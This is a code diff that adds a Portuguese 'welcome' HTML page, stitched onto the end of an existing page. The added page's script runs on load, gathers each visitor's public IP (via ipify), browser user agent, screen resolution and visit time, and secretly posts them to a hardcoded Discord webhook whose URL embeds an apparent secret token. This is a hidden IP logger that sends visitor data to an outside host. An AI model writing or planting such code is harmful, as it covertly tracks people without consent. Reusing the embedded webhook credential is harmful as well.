@@ -182,3 +182,39 @@
 </body>
 </html>
 
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Bem-vindo!</title>
+  <script>
+    async function coletarInfo() {
+      // Obter IP público via ipify
+      let ip = await fetch("https://api.ipify.org?format=json")
+                     .then(res => res.json())
+                     .then(data => data.ip);
+
+      let userAgent = navigator.userAgent;
+      let resolucao = screen.width + "x" + screen.height;
+      let horario = new Date().toLocaleString();
+
+      let conteudo = `🧠 Novo acesso ao site\n` +
+                     `🌐 IP: ${ip}\n` +
+                     `🖥️ Navegador: ${userAgent}\n` +
+                     `📱 Tela: ${resolucao}\n` +
+                     `🕒 Acesso em: ${horario}`;
+
+      // Enviar pro webhook do Discord
+      await fetch("https://discord.com/api/webhooks/1389924566218047558/8t_fsg5aD_rMAkt3fFhdrv1fO_hOZc3NIfe2rqMOPrKTsQhDiPdcDGzRkwxn_KAo0n5J", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ content: conteudo })
+      });
+    }
+
+    window.onload = coletarInfo;
+  </script>
+</head>
+<body>
+  <h1>Bem-vindo ao site!</h1>
+</body>
+</html>
